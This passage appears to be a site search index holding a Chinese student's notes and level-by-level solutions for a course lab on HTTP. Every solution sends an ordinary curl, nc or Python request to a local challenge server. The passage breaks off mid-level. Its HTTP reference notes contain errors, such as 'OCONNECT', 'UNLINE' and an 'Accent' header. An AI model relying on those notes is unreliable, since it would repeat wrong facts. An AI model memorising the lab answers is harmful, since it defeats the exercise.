\u8bf7\u6c42\u62a5\u6587\u7531\u56db\u4e2a\u90e8\u5206\u7ec4\u6210\uff1a \u8bf7\u6c42\u884c\uff08Request-Line\uff09 \u8bf7\u6c42\u5934\u90e8\uff08Request Header Fields\uff09 \u56de\u8f66\u6362\u884c\uff08CRLF\uff09 \u6d88\u606f\u4f53\uff08Message Body\uff09 \u8bf7\u6c42\u884c\uff08Request-Line\uff09 \u6211\u4eec\u6765\u770b\u4e00\u5f00\u59cb\u7ed9\u7684\u793a\u4f8b\u7684\u8bf7\u6c42\u884c POST / HTTP/1.1 \u8bf7\u6c42\u884c\u5206\u4e3a\u4e86\u4e09\u4e2a\u90e8\u5206\uff1a \u8bf7\u6c42\u65b9\u6cd5\uff08Method\uff09 \u8bf7\u6c42 URI HTTP \u534f\u8bae\u7248\u672c \u4e09\u8005\u4e4b\u95f4\u7528\u7a7a\u683c\u5206\u9694\u3002 \u8bf7\u6c42\u65b9\u6cd5 GET\uff1a\u83b7\u53d6\u8d44\u6e90 POST\uff1a\u4f20\u8f93\u5b9e\u4f53\u4e3b\u4f53 PUT\uff1a\u4f20\u8f93\u6587\u4ef6 HEAD\uff1a\u83b7\u5f97\u62a5\u6587\u9996\u90e8\uff08\u76f8\u5f53\u4e8eGET\u65b9\u6cd5\u83b7\u5f97\u7684\u8d44\u6e90\u53bb\u6389\u6b63\u6587\uff09 DELETE\uff1a\u5220\u9664\u6587\u4ef6 OPTIONS\uff1a\u8be2\u95ee\u652f\u6301\u7684\u65b9\u6cd5\uff08\u5ba2\u6237\u7aef\u95ee\u670d\u52a1\u5668\uff09 TRACE\uff1a\u8ffd\u8e2a\u8def\u5f84 OCONNECT\uff1a\u8981\u6c42\u7528\u96a7\u9053\u534f\u8bae\u8fde\u63a5\u4ee3\u7406 LINK\uff1a\u5efa\u7acb\u4e0e\u8d44\u6e90\u4e4b\u95f4\u7684\u8054\u7cfb UNLINE\uff1a\u65ad\u5f00\u8fde\u63a5\u5173\u7cfb \u8bf7\u6c42\u5934\u90e8\uff08Request Header Fields\uff09 \u8fd9\u90e8\u5206\u7531\u6210\u5bf9\u7684\u8bf7\u6c42\u5934\u90e8\u7ec4\u6210\uff0c\u7528\u6765\u544a\u77e5\u670d\u52a1\u7aef\u8bf7\u6c42\u7684\u66f4\u591a\u4fe1\u606f\u3002 \u8fd9\u662f\u672a\u6765\u7684\u91cd\u4e2d\u4e4b\u91cd\uff01\u52a1\u5fc5\u638c\u63e1\uff01 - Host \uff1a\u8bf7\u6c42\u7684\u8d44\u6e90\u5728\u54ea\u4e2a\u4e3b\u673a\u7684\u7aef\u53e3\u4e0a - Connection\uff1a\u8be5\u8bf7\u6c42\u652f\u6301\u957f\u8fde\u63a5\uff08heep_alive\uff09 - Content-Length\uff1a\u6b63\u6587\u5185\u5bb9\u957f\u5ea6 - Content-Type\uff1a\u6570\u636e\u7c7b\u578b - User-Agent\uff1a\u58f0\u660e\u7528\u6237\u7684\u64cd\u4f5c\u7cfb\u7edf\u548c\u6d4f\u89c8\u5668\u7248\u672c\u4fe1\u606f - Accent\uff1a\u53d1\u8d77\u4e86\u8bf7\u6c42 - Referer\uff1a\u5f53\u524d\u9875\u9762\u662f\u4ece\u54ea\u4e2a\u9875\u9762\u8df3\u8f6c\u8fc7\u6765\u7684 - Accept-Encoding\uff1a\u63a5\u53d7\u7684\u7f16\u7801 - Accept-Language\uff1a\u63a5\u53d7\u7684\u8bed\u8a00\u7c7b\u578b - Cookie\uff1a\u7528\u4e8e\u5728\u5ba2\u6237\u7aef\u5b58\u50a8\u5c11\u91cf\u4fe1\u606f\uff0c\u901a\u5e38\u7528\u4e8e\u5b9e\u73b0\u4f1a\u8bdd\uff08session\uff09\u529f\u80fd \u6d88\u606f\u4f53\uff08Message Body\uff09 \u8fd9\u90e8\u5206\u643a\u5e26\u4e86\u672c\u6b21\u8bf7\u6c42\u9700\u8981\u53d1\u5f80\u670d\u52a1\u7aef\u7684\u4fe1\u606f\uff0c\u6709\u7684 Method \u6709\u8fd9\u90e8\u5206\uff0c\u800c\u6709\u7684 Method \u4e0d\u9700\u8981\u8fd9\u90e8\u5206\u3002 \u6bd4\u5982 get \u65b9\u6cd5\u5c31\u6ca1\u6709\u6d88\u606f\u4f53\uff0cget \u65b9\u6cd5\u4e00\u822c\u90fd\u662f\u901a\u8fc7 query \u6765\u4f20\u9012\u53c2\u6570\u3002 \u800c post \u65b9\u6cd5\u4e00\u822c\u5c31\u6709\u6d88\u606f\u4f53\u3002 \u8bf7\u6c42\u5934\u90e8\u5177\u4f53\u4fe1\u606f ref https://zhuanlan.zhihu.com/p/112060856 https://blog.csdn.net/qq_40933663/article/details/90045869 Useful cmd /challenge/run Output: hacker@talking-web-level-12:~$ /challenge/run * Serving Flask app 'run' * Debug mode: off WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead. * Running on http://127.0.0.1:80 Press CTRL+C to quit \u884c\u5427\uff0c\u8fd9\u4e00\u5927\u5806\u6311\u6218\uff0c\u5012\u662f\u8ba9\u6211\u628acurl nc\u8fd9\u4fe9\u73a9\u610f\u513f\u73a9\u513f\u719f\u4e86\u3002\u3002\u3002 level1 Send an HTTP request using curl curl http://127.0.0.1:80 level2 Send an HTTP request using nc printf \"GET / HTTP/1.1\\r\\n\\r\\n\" | nc 127.0.0.1 80 ref a blog level3 Send an HTTP request using python import requests response = requests.get('http://127.0.0.1:80') print(response.content) level4 Set the host header in an HTTP request using curl curl -H 'Host: f04e757423e4172f7391a2c52dd6d52b' http://127.0.0.1:80 level5 Set the host header in an HTTP request using nc echo -e \"GET / HTTP/1.1\\r\\nHost: e87665191d938ed557e6d75bed2a59e7\\r\\n\\r\\n\" | nc 127.0.0.1 80 level6 Set the host header in an HTTP request using python import requests url = 'http://127.0.0.1:80' headers = {'Host': '37ae8c34ce6b69de03c0514664f1de72'} response = requests.get(url, headers=headers) print(response.text) level7 Set the path in an HTTP request using curl curl http://127.0.0.1:80/32edfeba32e2616897b6a4907182e609 level8 Set the path in an HTTP request using nc printf \"GET /a2ef4bee2f651380996e3e91ec9ae47b HTTP/1.1\\r\\n\\r\\n\" | nc 127.0.0.1 80 level9 Set the path in an HTTP request using python import requests url = 'http://127.0.0.1:80/563d4434a61e9b4f8aad9f89476f9d56' headers = {'Host': '37ae8c34ce6b69de03c0514664f1de72'} response = requests.get(url, headers=headers) print(response.text) level10 URL encode a path in an HTTP request using curl curl --request GET --url 'http://127.0.0.1/5db90f90%20c57f0931/898c7a05%207a6a6c70' level11 URL encode a path in an HTTP request using nc echo -ne \"GET /c84632a0%203d7cd667/cc68c4e5%205289cce4 HTTP/1.1\\r\\nHost: 127.0.0.1\\r\\n\\r\\n\" | nc 127.0.0.1 80 level12 URL encode a path in an HTTP request using python import http.client conn = http.client.HTTPConnection(\"127.0.0.1\", 80) path = '/24f18995%2035ce2423/0dc75e53%20a62355c0' conn.request(\"GET\", path) response = conn.getresponse() print(response.read().decode()) level13 Specify an argument in an HTTP request using curl curl -X GET \"http://127.0.0.1?a=d12e875e302a313b93e311080177c69e\" level14 Specify an argument in an HTTP request using nc echo -ne \"GET /?a=2469a7322bdff77e7cf50f7a397ecf1e HTTP/1.1\\r\\nHost: 127.0.0.1\\r\\n\\r\\n\" | nc 127.0.0.1 80 level15 Specify an argument in an HTTP request using python import http.client conn = http.client.HTTPConnection(\"127.0.0.1\", 80) params = 'a=70206814776ee99485d36f75416cc53e' conn.request(\"GET\", \"/?\" + params) response = conn.getresponse() print(response.read().decode()) or import requests url = 'http://127.0.0.1/?a=2469a7322bdff77e7cf50f7a397ecf1e' response = requests.get(url) print(response.text) level16 Specify multiple arguments in an HTTP request using curl curl -X GET \"http://127.0.0.1?a=ecd147484bddde7d37b1911de43a8879&b=40d9af5c%20d0b5b669%266fea1792%23e808fb58\" level17 Specify multiple arguments in an HTTP request using nc echo -ne \"GET /?a=5d723fd68383a9c49eb60b0633069601&b=164073f7%207871c6b5%26b94dd88d%23977ae717 HTTP/1.1\\r\\nHost: 127.0.0.1\\r\\n\\r\\n\" | nc 127.0.0.1 80 level18 Specify multiple arguments in an HTTP request using python import requests url = 'http://127.0.0.1/?a=4ce9272291b7199073124105d91e05b8&b=56eb0b42%204ae6359b%26f16e873e%2313ac55ab' response = requests.get(url) print(response.text) level19 Include form data in an HTTP request using curl curl -X POST -d \"a=aa62a14fe954e109fd0afd6a6b81ae87&b=123\" \"http://127.0.0.1/\" level20 Include form data in an HTTP request using nc echo -ne \"POST / HTTP/1.1\\r\\nHost: 127.0.0.1\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nContent-Length: 64\\r\\n\\r\\na=0f4e8daf3fc9d8aa6a59af8b111cd9b6\" | nc 127.0.0.1 80 level21 Include form data in an HTTP request using python import requests url = 'http://127.0.0.1/' data = {'a': '728301dd59f5157a45b164530cd4bd9a'} response = requests.post(url, data=data) print(response.text) level22 Include form data with multiple fields in an HTTP request using curl curl -X POST -d \"a=6d2e619d8691e29c605eacecff1d17f5&b=40f3c192%204a42b9c8%26042940eb%23ce8b5cc9\" \"http://127.0.0.1/\" level23 Include form data with multiple fields in an HTTP request using nc echo -ne \"POST / HTTP/1.1\\r\\nHost: 127.0.0.1\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nContent-Length: 78\\r\\n\\r\\na=7bd29b83c57c2e3a0c9f0387fabea724&b=20c245cf%2075d26cf5%26100f8c42%23d1702767\" | nc 127.0.0.1 80 level24 Include form data with multiple fields in an HTTP request using python import requests url = 'http://127.0.0.1/' data = {'a': 'db865b3bfd0d2e5ffa0c112dc700ddb9','b':'d7d3ad1a edee631b&eba293d5#d6e4cf79'} response = requests.post(url, data=data) print(response.text) level25 Include json data in an HTTP request using curl curl -X POST -H \"Content-Type: application/json\" -d '{\"a\": \"e1d94af35f929e364d037ca78f5dbfa0\"}' http://127.0.0.1/ level26 Include json data in an HTTP request using nc data='{\"a\": \"95a77ed287428e0fbc550158d061c07c\"}' length=$(echo -n \"$data\" | wc -c) printf 'POST / HTTP/1.1\\r\\nHost: 127.0.0.1\\r\\nContent-Type: application/json\\r\\nContent-Length: %s\\r\\n\\r\\n%s' \"$length\" \"$data\" | nc 127.0.0.1 80 level27 Include json data in an HTTP request using python import requests import json url = \"http://127.0.0.1\" data = {'a': \"98f37a6b119aec9d10b6a7de1934c9ca\"} json_data = json.dumps(data) headers = {'Content-Type': 'application/json'} response = requests.post(url, data=json_data, headers=headers) print(response.text) level28 Include complex json data in an HTTP request using curl curl -X POST -H \"Content-Type: application/json\" -d '{\"a\": \"39a0e409bba714d0ffe73ce038cb7b3a\", \"b\": {\"c\": \"930862ea\", \"d\": [\"c6a605f0\", \"c7ad7398 3fbbb9dc&458f3441#25f76ea0\"]}}' http://127.0.0.1/ level29 Include complex json data in an HTTP request using nc data='{\"a\": \"b7ae4afbfd6f78ad7ab06f1203ece1be\",\"b\":{\"c\": \"0ce40827\", \"d\": [\"fb1739d2\", \"5cde3361 bfdb9003&a42c27d5#f291d8c2\"]}}' length=$(echo -n \"$data\" | wc -c) printf 'POST / HTTP/1.1\\r\\nHost: 127.0.0.1\\r\\nContent-Type: application/json\\r\\nContent-Length: %s\\r\\n\\r\\n%s' \"$length\" \"$data\" | nc -q 0 127.0.0.1 80 level30 Include complex json data in an HTTP request using python import requests import json url = \"http://127.0.0.1\" data = {'a': \"04c2b7fc38f2a2057ab89b310a7d8311\", \"b\":{ 'c': '5ff12d56', 'd': ['93ca0c53', '9b346607 fa6d6f12&c772efa3#fddc4350'] } } json_data = json.dumps(data) headers = {'Content-Type': 'application/json'} response = requests.post(url, data=json_data, headers=headers) print(response.text) level31 Follow an HTTP redirect from HTTP response using curl curl -L http://127.0.0.1 level32 Follow an HTTP redirect from HTTP response using nc printf 'GET /fd33eca3350f203a7cc09fa116eaa060 HTTP/1.1\\r\\nHost: 127.0.0.1\\r\\nConnection: close\\r\\n\\r\\n' | nc -w 10 -q 0 127.0.0.1 80 level33 Follow an HTTP redirect from HTTP response using python import requests url = 'http://127.0.0.1' response = requests.get(url, allow_redirects=True) new_response = requests.get(response.url) print(new_response.text) level34 Include a cookie from HTTP response using curl curl -b \"cookie=d2b2eb6ac86abb563027659450780a51\" -L -v http://127.0.0.1 level35 Include a cookie from HTTP response using nc printf 'GET / HTTP/1.1\\r\\nHost: 127.0.0.1\\r\\nCookie: cookie=c1c5e422a53c2b73d080674d417d06fd\\r\\nConnection: close\\r\\n\\r\\n' | nc 127.0.0.1 80 level36 Include a cookie from HTTP response using python \u8c8c\u4f3c\u9898\u6709\u70b9\u513f\u6bdb\u75c5\u554a\u3002\u3002\u3002 import requests url = 'http://127.0.0.1' cookies = {'cookie_name': 'cookie_value'} response = requests.get(url, cookies=cookies) print(response.text) level37 Include a cookie from HTTP response using curl curl -c cookies.txt http://127.0.0.1 curl -b cookies.txt -L -v http://127.0.0.1 level38 Include a cookie from HTTP response using nc \u597d\u5427\u8fd9\u4e2a\u73a9\u610f\u513f\uff0c\u5c31\u662f\u91cd\u590d\u8fd0\u884c\u51e0\u904d\uff0c\u5c31\u884c\u4e86\uff0c\u5e94\u8be5\u5199\u4e2a\u811a\u672c\u3002\u3002\u3002 \u6211TM\u624b\u52a8\u8f93\u4e86\u597d\u51e0\u904d\uff0c\u6211\u65e5\u3002\u3002\u3002 printf 'GET / HTTP/1.1\\r\\nHost: 127.0.0.1\\r\\nCookie: session=eyJzdGF0ZSI6MX0.ZLMdXw.VU5O3fTNhAgzX_0GG5B3kRNVZ0M\\r\\nConnection: close\\r\\n\\r\\n' | nc 127.0.0.1 80 printf 'GET / HTTP/1.1\\r\\nHost: 127.0.0.1\\r\\nCookie: session=eyJzdGF0ZSI6Mn0.ZLMdcQ.Ip32pWs2LPaq23ckcO5TQSjN5Us\\r\\nConnection: close\\r\\n\\r\\n' | nc 127.0.0.1 80 printf 'GET / HTTP/1.1\\r\\nHost: 127.0.0.1\\r\\nCookie: session=eyJzdGF0ZSI6M30.ZLMdjQ.3QXprUl27h0da-RC0xjx1ZwrLZ0\\r\\nConnection: close\\r\\n\\r\\n' | nc 127.0.0.1 80 level39 Include a cookie from HTTP response using python \u8c8c\u4f3c\u786e\u5b9e\u6709\u6bdb\u75c5\u4e86 import requests url = 'http://127.0.0.1' cookies = {'cookie_name': 'cookie_value'} response = requests.get(url, cookies=cookies) print(response.text) \u788e\u788e\u5ff5\uff0c\u8fd9\u4e2anc\u662f\u771f\u7684\u96be\u7528\uff0c\u8fd8\u662fpython\u597d\u7528","title":"talking-web"},{"location":"en/CSE365/talking-web/#knoeledge","text":"\u91cd\u70b9\u662fhttp \u8bf7\u6c42\u62a5\u6587\uff0c\u8fd9\u90e8\u5206\u4e0d\u592a\u6d89\u53ca\u54cd\u5e94\u62a5\u6587 \u4e00\u4e2a http \u8bf7\u6c42\u62a5\u6587\u7531\u56db\u4e2a\u90e8\u5206\u7ec4\u6210\uff1a \u8bf7\u6c42\u884c\uff08Request-Line\uff09 \u8bf7\u6c42\u5934\u90e8\uff08Request Header Fields\uff09 \u56de\u8f66\u6362\u884c\uff08CRLF\uff09 \u6d88\u606f\u4f53\uff08Message Body\uff09","title":"knoeledge"},{"location":"en/CSE365/talking-web/#request-line","text":"\u6211\u4eec\u6765\u770b\u4e00\u5f00\u59cb\u7ed9\u7684\u793a\u4f8b\u7684\u8bf7\u6c42\u884c POST / HTTP/1.1 \u8bf7\u6c42\u884c\u5206\u4e3a\u4e86\u4e09\u4e2a\u90e8\u5206\uff1a \u8bf7\u6c42\u65b9\u6cd5\uff08Method\uff09 \u8bf7\u6c42 URI HTTP \u534f\u8bae\u7248\u672c \u4e09\u8005\u4e4b\u95f4\u7528\u7a7a\u683c\u5206\u9694\u3002","title":"\u8bf7\u6c42\u884c\uff08Request-Line\uff09"},{"location":"en/CSE365/talking-web/#_1","text":"GET\uff1a\u83b7\u53d6\u8d44\u6e90 POST\uff1a\u4f20\u8f93\u5b9e\u4f53\u4e3b\u4f53 PUT\uff1a\u4f20\u8f93\u6587\u4ef6 HEAD\uff1a\u83b7\u5f97\u62a5\u6587\u9996\u90e8\uff08\u76f8\u5f53\u4e8eGET\u65b9\u6cd5\u83b7\u5f97\u7684\u8d44\u6e90\u53bb\u6389\u6b63\u6587\uff09 DELETE\uff1a\u5220\u9664\u6587\u4ef6 OPTIONS\uff1a\u8be2\u95ee\u652f\u6301\u7684\u65b9\u6cd5\uff08\u5ba2\u6237\u7aef\u95ee\u670d\u52a1\u5668\uff09 TRACE\uff1a\u8ffd\u8e2a\u8def\u5f84 OCONNECT\uff1a\u8981\u6c42\u7528\u96a7\u9053\u534f\u8bae\u8fde\u63a5\u4ee3\u7406 LINK\uff1a\u5efa\u7acb\u4e0e\u8d44\u6e90\u4e4b\u95f4\u7684\u8054\u7cfb UNLINE\uff1a\u65ad\u5f00\u8fde\u63a5\u5173\u7cfb","title":"\u8bf7\u6c42\u65b9\u6cd5"},{"location":"en/CSE365/talking-web/#request-header-fields","text":"\u8fd9\u90e8\u5206\u7531\u6210\u5bf9\u7684\u8bf7\u6c42\u5934\u90e8\u7ec4\u6210\uff0c\u7528\u6765\u544a\u77e5\u670d\u52a1\u7aef\u8bf7\u6c42\u7684\u66f4\u591a\u4fe1\u606f\u3002 \u8fd9\u662f\u672a\u6765\u7684\u91cd\u4e2d\u4e4b\u91cd\uff01\u52a1\u5fc5\u638c\u63e1\uff01 - Host \uff1a\u8bf7\u6c42\u7684\u8d44\u6e90\u5728\u54ea\u4e2a\u4e3b\u673a\u7684\u7aef\u53e3\u4e0a - Connection\uff1a\u8be5\u8bf7\u6c42\u652f\u6301\u957f\u8fde\u63a5\uff08heep_alive\uff09 - Content-Length\uff1a\u6b63\u6587\u5185\u5bb9\u957f\u5ea6 - Content-Type\uff1a\u6570\u636e\u7c7b\u578b - User-Agent\uff1a\u58f0\u660e\u7528\u6237\u7684\u64cd\u4f5c\u7cfb\u7edf\u548c\u6d4f\u89c8\u5668\u7248\u672c\u4fe1\u606f - Accent\uff1a\u53d1\u8d77\u4e86\u8bf7\u6c42 - Referer\uff1a\u5f53\u524d\u9875\u9762\u662f\u4ece\u54ea\u4e2a\u9875\u9762\u8df3\u8f6c\u8fc7\u6765\u7684 - Accept-Encoding\uff1a\u63a5\u53d7\u7684\u7f16\u7801 - Accept-Language\uff1a\u63a5\u53d7\u7684\u8bed\u8a00\u7c7b\u578b - Cookie\uff1a\u7528\u4e8e\u5728\u5ba2\u6237\u7aef\u5b58\u50a8\u5c11\u91cf\u4fe1\u606f\uff0c\u901a\u5e38\u7528\u4e8e\u5b9e\u73b0\u4f1a\u8bdd\uff08session\uff09\u529f\u80fd","title":"\u8bf7\u6c42\u5934\u90e8\uff08Request Header Fields\uff09"},{"location":"en/CSE365/talking-web/#message-body","text":"\u8fd9\u90e8\u5206\u643a\u5e26\u4e86\u672c\u6b21\u8bf7\u6c42\u9700\u8981\u53d1\u5f80\u670d\u52a1\u7aef\u7684\u4fe1\u606f\uff0c\u6709\u7684 Method \u6709\u8fd9\u90e8\u5206\uff0c\u800c\u6709\u7684 Method \u4e0d\u9700\u8981\u8fd9\u90e8\u5206\u3002 \u6bd4\u5982 get \u65b9\u6cd5\u5c31\u6ca1\u6709\u6d88\u606f\u4f53\uff0cget \u65b9\u6cd5\u4e00\u822c\u90fd\u662f\u901a\u8fc7 query \u6765\u4f20\u9012\u53c2\u6570\u3002 \u800c post \u65b9\u6cd5\u4e00\u822c\u5c31\u6709\u6d88\u606f\u4f53\u3002","title":"\u6d88\u606f\u4f53\uff08Message Body\uff09"},{"location":"en/CSE365/talking-web/#_2","text":"","title":"\u8bf7\u6c42\u5934\u90e8\u5177\u4f53\u4fe1\u606f"},{"location":"en/CSE365/talking-web/#ref","text":"https://zhuanlan.zhihu.com/p/112060856 https://blog.csdn.net/qq_40933663/article/details/90045869","title":"ref"},{"location":"en/CSE365/talking-web/#useful-cmd","text":"/challenge/run Output: hacker@talking-web-level-12:~$ /challenge/run * Serving Flask app 'run' * Debug mode: off WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead. * Running on http://127.0.0.1:80 Press CTRL+C to quit \u884c\u5427\uff0c\u8fd9\u4e00\u5927\u5806\u6311\u6218\uff0c\u5012\u662f\u8ba9\u6211\u628acurl nc\u8fd9\u4fe9\u73a9\u610f\u513f\u73a9\u513f\u719f\u4e86\u3002\u3002\u3002","title":"Useful cmd"},{"location":"en/CSE365/talking-web/#level1","text":"Send an HTTP request using curl curl http://127.0.0.1:80","title":"level1"},{"location":"en/CSE365/talking-web/#level2","text":"Send an HTTP request using nc printf \"GET / HTTP/1.1\\r\\n\\r\\n\" | nc 127.0.0.1 80","title":"level2"},{"location":"en/CSE365/talking-web/#ref_1","text":"a blog","title":"ref"},{"location":"en/CSE365/talking-web/#level3","text":"Send an HTTP request using python import requests response = requests.get('http://127.0.0.1:80') print(response.content)","title":"level3"},{"location":"en/CSE365/talking-web/#level4","text":"Set the host header in an HTTP request using curl curl -H 'Host: f04e757423e4172f7391a2c52dd6d52b' http://127.0.0.1:80","title":"level4"},{"location":"en/CSE365/talking-web/#level5","text":"Set the host header in an HTTP request using nc echo -e \"GET / HTTP/1.1\\r\\nHost: e87665191d938ed557e6d75bed2a59e7\\r\\n\\r\\n\" | nc 127.0.0.1 80","title":"level5"},{"location":"en/CSE365/talking-web/#level6","text":"Set the host header in an HTTP request using python import requests url = 'http://127.0.0.1:80' headers = {'Host': '37ae8c34ce6b69de03c0514664f1de72'} response = requests.get(url, headers=headers) print(response.text)","title":"level6"},{"location":"en/CSE365/talking-web/#level7","text":"Set the path in an HTTP request using curl curl http://127.0.0.1:80/32edfeba32e2616897b6a4907182e609","title":"level7"},{"location":"en/CSE365/talking-web/#level8","text":"Set the path in an HTTP request using nc printf \"GET /a2ef4bee2f651380996e3e91ec9ae47b HTTP/1.1\\r\\n\\r\\n\" | nc 127.0.0.1 80","title":"level8"},{"location":"en/CSE365/talking-web/#level9","text":"Set the path in an HTTP request using python import requests url = 'http://127.0.0.1:80/563d4434a61e9b4f8aad9f89476f9d56' headers = {'Host': '37ae8c34ce6b69de03c0514664f1de72'} response = requests.get(url, headers=headers) print(response.text)","title":"level9"},{"location":"en/CSE365/talking-web/#level10","text":"URL encode a path in an HTTP request using curl curl --request GET --url 'http://127.0.0.1/5db90f90%20c57f0931/898c7a05%207a6a6c70'","title":"level10"},{"location":"en/CSE365/talking-web/#level11","text":"URL encode a path in an HTTP request using nc echo -ne \"GET /c84632a0%203d7cd667/cc68c4e5%205289cce4 HTTP/1.1\\r\\nHost: 127.0.0.1\\r\\n\\r\\n\" | nc 127.0.0.1 80","title":"level11"},{"location":"en/CSE365/talking-web/#level12","text":"URL encode a path in an HTTP request using python import http.client conn = http.client.HTTPConnection(\"127.0.0.1\", 80) path = '/24f18995%2035ce2423/0dc75e53%20a62355c0' conn.request(\"GET\", path) response = conn.getresponse() print(response.read().decode())","title":"level12"},{"location":"en/CSE365/talking-web/#level13","text":"Specify an argument in an HTTP request using curl curl -X GET \"http://127.0.0.1?a=d12e875e302a313b93e311080177c69e\"","title":"level13"},{"location":"en/CSE365/talking-web/#level14","text":"Specify an argument in an HTTP request using nc echo -ne \"GET /?a=2469a7322bdff77e7cf50f7a397ecf1e HTTP/1.1\\r\\nHost: 127.0.0.1\\r\\n\\r\\n\" | nc 127.0.0.1 80","title":"level14"},{"location":"en/CSE365/talking-web/#level15","text":"Specify an argument in an HTTP request using python import http.client conn = http.client.HTTPConnection(\"127.0.0.1\", 80) params = 'a=70206814776ee99485d36f75416cc53e' conn.request(\"GET\", \"/?\" + params) response = conn.getresponse() print(response.read().decode()) or import requests url = 'http://127.0.0.1/?a=2469a7322bdff77e7cf50f7a397ecf1e' response = requests.get(url) print(response.text)","title":"level15"},{"location":"en/CSE365/talking-web/#level16","text":"Specify multiple arguments in an HTTP request using curl curl -X GET \"http://127.0.0.1?a=ecd147484bddde7d37b1911de43a8879&b=40d9af5c%20d0b5b669%266fea1792%23e808fb58\"","title":"level16"},{"location":"en/CSE365/talking-web/#level17","text":"Specify multiple arguments in an HTTP request using nc echo -ne \"GET /?a=5d723fd68383a9c49eb60b0633069601&b=164073f7%207871c6b5%26b94dd88d%23977ae717 HTTP/1.1\\r\\nHost: 127.0.0.1\\r\\n\\r\\n\" | nc 127.0.0.1 80","title":"level17"},{"location":"en/CSE365/talking-web/#level18","text":"Specify multiple arguments in an HTTP request using python import requests url = 'http://127.0.0.1/?a=4ce9272291b7199073124105d91e05b8&b=56eb0b42%204ae6359b%26f16e873e%2313ac55ab' response = requests.get(url) print(response.text)","title":"level18"},{"location":"en/CSE365/talking-web/#level19","text":"Include form data in an HTTP request using curl curl -X POST -d \"a=aa62a14fe954e109fd0afd6a6b81ae87&b=123\" \"http://127.0.0.1/\"","title":"level19"},{"location":"en/CSE365/talking-web/#level20","text":"Include form data in an HTTP request using nc echo -ne \"POST / HTTP/1.1\\r\\nHost: 127.0.0.1\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nContent-Length: 64\\r\\n\\r\\na=0f4e8daf3fc9d8aa6a59af8b111cd9b6\" | nc 127.0.0.1 80","title":"level20"},{"location":"en/CSE365/talking-web/#level21","text":"Include form data in an HTTP request using python import requests url = 'http://127.0.0.1/' data = {'a': '728301dd59f5157a45b164530cd4bd9a'} response = requests.post(url, data=data) print(response.text)","title":"level21"},{"location":"en/CSE365/talking-web/#level22","text":"Include form data with multiple fields in an HTTP request using curl curl -X POST -d \"a=6d2e619d8691e29c605eacecff1d17f5&b=40f3c192%204a42b9c8%26042940eb%23ce8b5cc9\" \"http://127.0.0.1/\"","title":"level22"},{"location":"en/CSE365/talking-web/#level23","text":"Include form data with multiple fields in an HTTP request using nc echo -ne \"POST / HTTP/1.1\\r\\nHost: 127.0.0.1\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nContent-Length: 78\\r\\n\\r\\na=7bd29b83c57c2e3a0c9f0387fabea724&b=20c245cf%2075d26cf5%26100f8c42%23d1702767\" | nc 127.0.0.1 80","title":"level23"},{"location":"en/CSE365/talking-web/#level24","text":"Include form data with multiple fields in an HTTP request using python import requests url = 'http://127.0.0.1/' data = {'a': 'db865b3bfd0d2e5ffa0c112dc700ddb9','b':'d7d3ad1a edee631b&eba293d5#d6e4cf79'} response = requests.post(url, data=data) print(response.text)","title":"level24"},{"location":"en/CSE365/talking-web/#level25","text":"Include json data in an HTTP request using curl curl -X POST -H \"Content-Type: application/json\" -d '{\"a\": \"e1d94af35f929e364d037ca78f5dbfa0\"}' http://127.0.0.1/","title":"level25"},{"location":"en/CSE365/talking-web/#level26","text":"Include json data in an HTTP request using nc data='{\"a\": \"95a77ed287428e0fbc550158d061c07c\"}' length=$(echo -n \"$data\" | wc -c) printf 'POST / HTTP/1.1\\r\\nHost: 127.0.0.1\\r\\nContent-Type: application/json\\r\\nContent-Length: %s\\r\\n\\r\\n%s' \"$length\" \"$data\" | nc 127.0.0.1 80","title":"level26"},{"location":"en/CSE365/talking-web/#level27","text":"Include json data in an HTTP request using python import requests import json url = \"http://127.0.0.1\" data = {'a': \"98f37a6b119aec9d10b6a7de1934c9ca\"} json_data = json.dumps(data) headers = {'Content-Type': 'application/json'} response = requests.post(url, data=json_data, headers=headers) print(response.text)","title":"level27"},{"location":"en/CSE365/talking-web/#level28","text":"Include complex json data in an HTTP request using curl curl -X POST -H \"Content-Type: application/json\" -d '{\"a\": \"39a0e409bba714d0ffe73ce038cb7b3a\", \"b\": {\"c\": \"930862ea\", \"d\": [\"c6a605f0\", \"c7ad7398 3fbbb9dc&458f3441#25f76ea0\"]}}' http://127.0.0.1/","title":"level28"},{"location":"en/CSE365/talking-web/#level29","text":"Include complex json data in an HTTP request using nc data='{\"a\": \"b7ae4afbfd6f78ad7ab06f1203ece1be\",\"b\":{\"c\": \"0ce40827\", \"d\": [\"fb1739d2\", \"5cde3361 bfdb9003&a42c27d5#f291d8c2\"]}}' length=$(echo -n \"$data\" | wc -c) printf 'POST / HTTP/1.1\\r\\nHost: 127.0.0.1\\r\\nContent-Type: application/json\\r\\nContent-Length: %s\\r\\n\\r\\n%s' \"$length\" \"$data\" | nc -q 0 127.0.0.1 80","title":"level29"},{"location":"en/CSE365/talking-web/#level30","text":"Include complex json data in an HTTP request using python import requests import json url = \"http://127.0.0.1\" data = {'a': \"04c2b7fc38f2a2057ab89b310a7d8311\", \"b\":{ 'c': '5ff12d56', 'd': ['93ca0c53', '9b346607 fa6d6f12&c772efa3#fddc4350'] } } json_data = json.dumps(data) headers = {'Content-Type': 'application/json'} response = requests.post(url, data=json_data, headers=headers) print(response.text)","title":"level30"},{"location":"en/CSE365/talking-web/#level31","text":"Follow an HTTP redirect from HTTP response using curl curl -L http://127.0.0.1","title":"level31"},{"location":"en/CSE365/talking-web/#level32","text":"Follow an HTTP redirect from HTTP response using nc printf 'GET /fd33eca3350f203a7cc09fa116eaa060 HTTP/1.1\\r\\nHost: 127.0.0.1\\r\\nConnection: close\\r\\n\\r\\n' | nc -w 10 -q 0 127.0.0.1 80","title":"level32"},{"location":"en/CSE365/talking-web/#level33","text":"Follow an HTTP redirect from HTTP response using python import requests url = 'http://127.0.0.1' response = requests.get(url, allow_redirects=True) new_response = requests.get(response.url) print(new_response.text)","title":"level33"},{"location":"en/CSE365/talking-web/#level34","text":"Include a cookie from HTTP response using curl curl -b \"cookie=d2b2eb6ac86abb563027659450780a51\" -L -v http://127.0.0.1","title":"level34"},{"location":"en/CSE365/talking-web/#level35","text":"Include a cookie from HTTP response using nc printf 'GET / HTTP/1.1\\r\\nHost: 127.0.0.1\\r\\nCookie: cookie=c1c5e422a53c2b73d080674d417d06fd\\r\\nConnection: 